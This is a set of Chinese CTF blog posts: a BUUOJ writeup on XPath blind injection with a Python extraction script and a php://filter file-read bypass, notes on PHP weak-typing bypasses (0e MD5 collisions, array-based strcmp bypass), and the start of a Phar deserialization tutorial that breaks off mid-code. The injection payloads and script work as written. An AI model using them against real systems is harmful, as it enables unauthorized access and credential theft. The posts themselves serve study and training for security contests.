<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>root<span class="operator">/</span>accounts<span class="operator">/</span><span class="keyword">user</span>[username<span class="operator">/</span>text()<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> ]<span class="operator">|</span><span class="operator">/</span><span class="comment">/*|ss[&#x27;&#x27; and password/text()=&#x27;1&#x27;]</span></span><br></pre></td></tr></table></figure></div>

<p>即先闭合前面的语句，之后列出文档所有元素</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">3.</span>盲注，需要一级一级猜解节点；猜解第一级节点：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(name(/*[position()=1]),1,1)=&#x27;</span>r<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div>

<h2 id="然后是注入-大佬的exp"><a href="#然后是注入-大佬的exp" class="headerlink" title="然后是注入## 大佬的exp"></a>然后是注入<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">猜解第二级节点数量：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or count(/root/*)=2 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>fake</span><br><span class="line"></span><br><span class="line">猜解第二级节点：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(name(/root/*[position()=1]),1,1)=&#x27;</span>u<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line">猜解id为<span class="number">1</span>的<span class="keyword">user</span>节点下的username值：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(/root/users/user[id=1]/username,1,1)=&#x27;</span>a<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div><br>## 大佬的exp<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://buuoj-test.cn/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token</span>():</span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">&#x27;login.php&#x27;</span>,data=data,headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">&quot;&#x27; or  substring(name(/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;accounts&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;***************false&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">&#x27;ad&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            <span class="built_in">print</span>(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div></h2><p>得到 <code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code><br>md5解密 gtfly123</p>
<p>登陆成功后，看到URL为 <code>admin.php?file=welcome</code><br>查看源码，看到有 <code>base64</code> 加密后的 <code>flag is in /flag</code><br>说明还考查文件包含，用伪协议打，测了一下，大概有几个过滤 <code>php read base64</code><br>也还是简单，大小写绕过</p>
<p><code>/admin.php?file=Php://filter/Read=convert.Base64-encode/resource=/flag</code></p>
<hr>
<p>后面的一些题目先摸了，有空再来看了</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP code audit</title>
    <url>/yakko117/2019/01/22/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PHP弱类型总结"><a href="#PHP弱类型总结" class="headerlink" title="PHP弱类型总结"></a>PHP弱类型总结</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自己是个ctf萌新，对于code audit完全是一脸懵的情况；最近的ctf比赛，基本上每次都有php代码审计题。 然后这里开个坑，从零开始积累<strong>php代码审计</strong></p>
<span id="more"></span>
<p>(ps:参考了无数大佬的文章 做了个归纳总结，以后也会不断把自己的积累记录下来的)</p>
<hr>
<h2 id="知识介绍"><a href="#知识介绍" class="headerlink" title="知识介绍"></a>知识介绍</h2><p>php中有两种比较的符号 <strong>&#x3D;&#x3D;</strong> 与 <strong>&#x3D;&#x3D;&#x3D;</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$a</span> = <span class="variable">$b</span> ;</span><br><span class="line"> <span class="variable">$a</span>===<span class="variable">$b</span> ;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>&#x3D;&#x3D;&#x3D;</strong> 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br><strong>&#x3D;&#x3D;</strong> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<pre><code>如果比较一个数字和字符串或者比较涉及到数字内容的字符串
则字符串会被转换成数值并且比较按照数值来进行
</code></pre>
<p>这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值</p>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">//上述代码可自行测试</span></span><br></pre></td></tr></table></figure></div>
<p><code>&quot;admin&quot;==0</code>比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等<br> <code>&quot;1admin&quot;==1</code>比较的时候会将1admin转化成数值,结果为1，而<code>&quot;admin1&quot;==1</code> 却等于错误，也就是”admin1”被转化成了0<br><code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
<p>对于上述的问题我查了php手册</p>
<blockquote>
<p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<code>. e E</code> 并且其数值值在整形的范围之内,该字符串被当作int来取值，其他所有情况下都被作为float来取值，<strong>该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</strong></p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="number">1</span> + <span class="string">&quot;10.5&quot;</span>;  <span class="comment">// $test=11.5(float)</span></span><br><span class="line"><span class="variable">$test</span> = <span class="number">1</span> + <span class="string">&quot;-1.3e3&quot;</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line"><span class="variable">$test</span> = <span class="number">1</span> + <span class="string">&quot;bob-1.3e3&quot;</span>;  <span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="variable">$test</span> = <span class="number">1</span> + <span class="string">&quot;2admin&quot;</span>;  <span class="comment">//$test=3(int)</span></span><br><span class="line"><span class="variable">$test</span> = <span class="number">1</span> + <span class="string">&quot;admin2&quot;</span>;  <span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>所以就解释了<code>&quot;admin1&quot;==1 =&gt;False</code> 的原因</p>
<hr>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="MD5-绕过"><a href="#MD5-绕过" class="headerlink" title="MD5 绕过"></a>MD5 绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$Username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$Username</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>) ) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$Username</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$logined</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句,<strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZO’)</strong> 成功绕过!</p>
<p>南邮这里有一道差不多的 [南邮ctf例题](<a href="http://ctf.nuptzj.cn/challenges#md5">http://ctf.nuptzj.cn/challenges#md5</a> collision)</p>
<hr>
<h3 id="json-绕过"><a href="#json-绕过" class="headerlink" title="json 绕过"></a>json 绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>输入一个json类型的字符串，<code>json_decode</code>函数解密成一个数组，判断数组中key的值是否等于 <code>$key</code> 的值，但是 <code>$key</code> 的值我们不知道，但是可以利用 <code>0==&quot;admin&quot;</code> 这种形式绕过<br>最终 <strong><code>payload message=&#123;&quot;key&quot;:0&#125;</code></strong></p>
<hr>
<h3 id="array-search-与-is-array-绕过"><a href="#array-search-与-is-array-绕过" class="headerlink" title="array_search 与 is_array 绕过"></a><strong>array_search 与 is_array</strong> 绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$test</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>先判断传入的是不是数组，然后循环遍历数组中的每个值<br>并且数组中的每个值不能和<code>admin</code>相等，并且将每个值转化为<code>int类型</code><br>再判断传入的数组是否有<code>admin</code>，有则返回flag</p>
<p><code>payload test[]=0</code>可以绕过</p>
<p>下面是官方手册对array_search的介绍</p>
<pre><code>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )
</code></pre>
<p><code>$needle</code>，<code>$haystack</code>必需，<code>$strict</code>可选 <br> 函数判断<code>$haystack</code>中的值是存在<code>$needle</code>，存在则返回该值的键值<br> 第三个参数默认为<code>false</code>，如果设置为<code>true</code>则会进行严格过滤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0) =&gt; 返回键值0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_seach</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>));  <span class="comment">// int(1) ==&gt;返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>array_search</strong>函数,类似于 <strong>&#x3D;&#x3D;</strong> 也就是 <code>$a==&quot;admin&quot;</code> 当然是<code>$a=0</code>  当然如果第三个参数为<code>true</code>则就不能绕过</p>
<hr>
<h3 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a><strong>strcmp</strong>漏洞绕过 <strong>php -v &lt;5.3</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>strcmp</code>是比较两个字符串，如果<code>str1&lt;str2</code> 则返回&lt;0 如果<code>str1&gt;str2</code>返回&gt;0 如果两者相等,返回0</p>
<p>我们是不知道<code>$password</code>的值的，题目要求<code>strcmp</code>判断的接受的值和<code>$password</code>必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p>
<p>我们传入 <code>password[]=xxx</code> 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>
<pre><code>payload: password[]=xxx
</code></pre>
<hr>
<h3 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;4admin&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail1&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail2&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail3&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;sucess&quot;</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failall&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>后面慢慢填坑吧</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP中关于Phar的学习</title>
    <url>/yakko117/2019/12/02/Phar/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。</p>
<span id="more"></span>

<h1 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h1><blockquote>
<p>一个PHP程序往往是由多个文件组成的,如果能够集中为一个文件来分发和运行是很方便的。phar便应运而生。大概跟java的jar文件是差不多类似的。但是php的phar文件是可以由php本身进行处理的,不需要额外的工具来创建、提取。</p>
</blockquote>
<h2 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h2><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://，zlib://或php://</code>。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如</span><br><span class="line">include(&#x27;php://filter/read=convert.base64-encode/resource=index.php&#x27;);</span><br><span class="line">include(&#x27;data://text/plain;base64,xxxxxxxxxxxx&#x27;);</span><br><span class="line"></span><br><span class="line">phar:// 也是流包装的一种</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="phar文件的结构"><a href="#phar文件的结构" class="headerlink" title="phar文件的结构"></a>phar文件的结构</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>phar</code> 文件标识，格式为 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span>；</span><br></pre></td></tr></table></figure></div>

<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>压缩文件的属性等信息，以序列化存储(我们可以注入反序列化字符串)</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容；</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，放在文件末尾；</p>
<hr>
<h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><p>在官方手册中提到，phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分，一是文件标识必须以 <code>__HALT_COMPILER();?&gt;</code> 结尾，否则PHP扩展就无法识别，但是前面的内容没有限制，因此我们可以随意在前面添加文件头，例如 <code>GIF89a</code> 来绕过一些上传的检测。二是反序列化，phar存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code> 伪协议解析phar文件时就会将数据反序列化。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau4w1wj30ul0dvgn2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau4w1wj30ul0dvgn2.jpg" class="lazyload"></a></p>
<hr>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; 